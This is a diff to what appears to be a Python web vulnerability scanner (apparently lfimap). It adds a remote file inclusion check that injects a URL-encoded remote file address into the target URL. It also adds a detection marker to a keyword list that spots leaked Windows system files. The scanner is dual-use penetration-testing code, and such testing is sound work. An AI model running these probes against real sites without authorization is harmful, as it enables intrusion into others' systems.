@@ -195,6 +195,19 @@ def test_expect_wrapper(url):
     if(checkPayload(res)):
         print("[+] RCE -> " + u)
 
+def test_rfi(url):
+    testCase = "https%3A%2F%2Fraw.githubusercontent.com%2Fhansmach1ne%2Flfimap%2Fmain%2FREADME.md"
+    if("DESTROY" in url):
+        u = url.replace("DESTROY", testCase)
+    try:
+        res = requests.get(u, headers = headers, timeout = 5)
+        if(checkPayload(res)):
+            print("[+] RFI -> " + u)
+    except:
+        print("\nRFI check timed out\n")
+
+
+
 #You can add custom patterns in responses depending on the wordlist used
 #Checks if sent payload is executed
 def checkPayload(webResponse):
@@ -204,7 +217,7 @@ def checkPayload(webResponse):
             "; for 16-bit app support", "sample HOSTS file used by Microsoft",
             "Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg",
             ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg",
-            "c2FtcGxlIEhPU1RT"]
+            "c2FtcGxlIEhPU1RT", "=1943785348b45"]
 
     for i in range(len(KEY_WORDS)):
         if KEY_WORDS[i] in webResponse.text:
@@ -219,6 +232,7 @@ def main():
         test_php_input(url)
         test_data_wrapper(url)
         test_expect_wrapper(url)
+        test_rfi(url)
         test_wordlist(url)
         
         print("Done.")
@@ -241,6 +255,7 @@ def main():
         test_php_input(url)
         test_data_wrapper(url)
         test_expect_wrapper(url)
+        test_rfi(url)
 
     print("Done.")
     exit(0)
